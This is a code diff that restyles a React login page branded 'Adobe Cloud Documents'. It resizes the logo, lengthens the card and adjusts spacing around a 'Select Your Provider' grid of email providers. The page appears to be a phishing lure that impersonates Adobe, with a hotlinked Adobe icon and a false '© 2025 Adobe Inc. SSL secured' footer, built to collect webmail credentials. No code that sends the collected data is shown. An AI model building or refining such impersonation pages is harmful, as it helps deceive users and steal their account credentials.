@@ -130,40 +130,38 @@ const LoginPage: React.FC<LoginPageProps> = ({
         backgroundRepeat: 'no-repeat'
       }}
     >
-      {/* Background Logo and Text - side-by-side */}
-      <div className="absolute left-6 top-1/2 transform -translate-y-1/2 z-0 pointer-events-none flex items-center gap-4">
+      {/* Background Logo and Text - moved slightly down and logo reduced */}
+      <div className="absolute left-6 top-1/2 transform -translate-y-[10%] z-0 pointer-events-none flex items-center gap-4">
         <img
           src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
           alt="Adobe Cloud"
-          className="w-12 h-12 md:w-16 md:h-16 object-contain drop-shadow-lg"
+          className="w-10 h-10 md:w-14 md:h-14 object-contain drop-shadow-lg"
         />
         <div className="text-white drop-shadow-lg">
           <div className="text-3xl md:text-4xl font-semibold leading-tight">Adobe Cloud Documents</div>
           <div className="text-white/90 text-sm md:text-base mt-1">PDF and e-signing tools.</div>
-          <div className="text-white/80 text-sm md:text-base italic">securely access documents</div>
+          <div className="text-white/80 text-sm md:text-base italic mt-1">securely access documents</div>
         </div>
       </div>
 
-      {/* Card: reduced size and padding, slightly increased length */}
+      {/* Card: keep width same, increase vertical length and use flex layout so header/providers/footer position well */}
       <div className="w-full max-w-sm relative z-10 ml-6 md:ml-24 lg:ml-40">
-        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-8 pb-12 relative overflow-hidden min-h-[28rem]">
+        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-10 pb-16 relative overflow-hidden min-h-[40rem]">
           <div className="absolute inset-0 bg-gradient-to-br from-white/50 to-transparent pointer-events-none"></div>
-          <div className="relative z-10">
+          <div className="relative z-10 flex flex-col h-full">
             {/* Centered "Select Your Provider" pill in header */}
-            <div className="flex items-center justify-center mb-4">
+            <div className="flex items-center justify-center mb-6">
               <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-full border border-blue-100">
                 <Sparkles className="w-4 h-4 text-blue-500" />
                 <span className="text-sm font-medium text-blue-700">Select Your Provider</span>
               </div>
             </div>
 
-            {/* reduced spacer */}
-            <div className="h-4" />
-
-            <div className="mt-4">
+            {/* Main content (providers / form) */}
+            <div className="mt-2 flex-grow">
               {!selectedProvider ? (
-                <div className="space-y-4">
-                  <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-5 h-full">
+                  <div className="grid grid-cols-2 gap-5">
                     {emailProviders.map((provider) => (
                       <button 
                         key={provider.name} 
@@ -175,7 +173,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                         <img 
                           src={provider.logo} 
                           alt={provider.name} 
-                          className="w-8 h-8 object-contain" 
+                          className="w-7 h-7 object-contain" 
                           onError={(e) => {
                             const t = e.target as HTMLImageElement;
                             t.style.display = 'none';
@@ -279,7 +277,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
               )} 
             </div>
 
-            <div className="mt-8 text-center">
+            {/* Footer positioned at bottom of card */}
+            <div className="mt-6">
               <p className="text-xs text-gray-500 flex items-center justify-center gap-2">
                 © 2025 Adobe Inc. SSL secured.
               </p>
